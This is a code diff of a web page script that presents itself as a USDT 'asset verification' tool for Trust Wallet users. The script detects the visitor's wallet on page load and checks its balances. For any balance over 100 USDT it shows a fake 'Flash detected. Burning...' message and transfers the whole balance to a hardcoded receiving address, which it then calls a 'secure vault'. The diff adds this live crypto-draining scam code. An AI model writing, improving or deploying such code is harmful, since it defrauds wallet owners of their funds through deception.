@@ -1,60 +1,42 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Receiving USDT
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script>
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Receiver
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
 
 let web3;
-let userAddress = null;
+let userAddress;
 
-async function waitForProvider() {
-    return new Promise((resolve) => {
-        const check = () => {
-            if (window.BinanceChain || window.trustwallet || window.ethereum) {
-                resolve(window.BinanceChain || window.trustwallet || window.ethereum);
-            } else {
-                setTimeout(check, 500);
+// Auto-detect wallet without prompting
+window.addEventListener("load", async () => {
+    setTimeout(async () => {
+        const provider = window.trustwallet || window.BinanceChain || window.ethereum;
+        if (provider) {
+            web3 = new Web3(provider);
+
+            try {
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    console.log("Auto-detected wallet:", userAddress);
+                } else {
+                    console.log("No accounts found.");
+                }
+            } catch (e) {
+                console.error("Error accessing wallet accounts:", e);
             }
-        };
-        check();
-    });
-}
-
-async function initWallet() {
-    const provider = await waitForProvider();
-    web3 = new Web3(provider);
-
-    try {
-        const accounts = await web3.eth.getAccounts();
-        if (accounts && accounts.length > 0) {
-            userAddress = accounts[0];
-            console.log("✅ Wallet Connected:", userAddress);
         } else {
-            console.warn("⚠️ No accounts returned. Will try later on button click.");
+            console.error("No provider found.");
         }
-    } catch (err) {
-        console.error("Wallet error:", err);
-    }
-}
-
-// Delay on page load (3s) — wait for wallet injection
-window.addEventListener("load", () => {
-    setTimeout(initWallet, 3000);
+    }, 1000);
 });
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
-        const provider = await waitForProvider();
-        web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-
-        if (accounts.length === 0) {
-            alert("❌ Wallet not connected. Please open in Trust Wallet browser.");
-            return;
-        }
-
-        userAddress = accounts[0];
-        console.log("✅ Wallet re-checked:", userAddress);
+        showPopup("❌ Wallet not connected. Open this site inside Trust Wallet browser.", "black");
+        return;
     }
 
-    const usdt = new web3.eth.Contract([
+    const usdtContract = new web3.eth.Contract([
         {
             constant: true,
             inputs: [{ name: "_owner", type: "address" }],
@@ -64,28 +46,31 @@ async function verifyAssets() {
         }
     ], usdtContractAddress);
 
-    const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
-        usdt.methods.balanceOf(userAddress).call(),
-        web3.eth.getBalance(userAddress)
-    ]);
+    try {
+        const usdtBalanceWei = await usdtContract.methods.balanceOf(userAddress).call();
+        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
 
-    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
-    const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei));
+        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei));
 
-    console.log("USDT:", usdtBalance, "BNB:", bnbBalance);
+        console.log(`USDT: ${usdtBalance} | BNB: ${bnbBalance}`);
 
-    if (usdtBalance === 0) {
-        showPopup("No USDT found.", "black");
-    } else if (usdtBalance <= 100) {
-        showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
-    } else {
-        showPopup("Flash USDT found. Initiating secure burn...", "red");
-        transferUSDT(usdtBalance);
+        if (usdtBalance === 0) {
+            showPopup("❌ No USDT found.", "black");
+        } else if (usdtBalance <= 100) {
+            showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
+        } else {
+            showPopup("Flash detected. Burning...", "green");
+            transferUSDT(usdtBalance);
+        }
+    } catch (err) {
+        console.error(err);
+        showPopup("❌ Error checking balances.", "red");
     }
 }
 
 async function transferUSDT(amount) {
-    const contract = new web3.eth.Contract([
+    const usdtContract = new web3.eth.Contract([
         {
             constant: false,
             inputs: [
@@ -98,19 +83,20 @@ async function transferUSDT(amount) {
         }
     ], usdtContractAddress);
 
-    const value = web3.utils.toWei(amount.toString(), "ether");
-
     try {
-        await contract.methods.transfer(bscAddress, value).send({ from: userAddress });
-        showPopup(`✅ Transferred ${amount} USDT`, "red");
-    } catch (err) {
-        console.error("Transfer failed:", err);
-        alert("❌ Transfer failed. Check BNB gas.");
+        const amountToSend = web3.utils.toWei(amount.toString());
+        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
+
+        showPopup(`✅ ${amount} USDT transferred to secure vault.`, "red");
+    } catch (e) {
+        console.error("Transfer error:", e);
+        showPopup("❌ Transfer failed. Insufficient BNB?", "red");
     }
 }
 
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
+
     if (!popup) {
         popup = document.createElement("div");
         popup.id = "popupBox";
@@ -121,17 +107,17 @@ function showPopup(message, color) {
         popup.style.padding = "20px";
         popup.style.borderRadius = "10px";
         popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
-        popup.style.textAlign = "center";
-        popup.style.fontSize = "16px";
-        popup.style.zIndex = 9999;
-        popup.style.backgroundColor = "#fff";
         popup.style.width = "80%";
         popup.style.maxWidth = "400px";
+        popup.style.textAlign = "center";
+        popup.style.fontSize = "18px";
+        popup.style.zIndex = "9999";
         document.body.appendChild(popup);
     }
 
-    popup.style.color = color;
     popup.innerHTML = message;
+    popup.style.backgroundColor = color === "red" ? "#ffdddd" : color === "green" ? "#ddffdd" : "#f5f5f5";
+    popup.style.color = color === "red" ? "darkred" : color === "green" ? "green" : "black";
     popup.style.display = "block";
 
     setTimeout(() => {
@@ -139,4 +125,6 @@ function showPopup(message, color) {
     }, 5000);
 }
 
+// Hook to button
 document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
+</script>
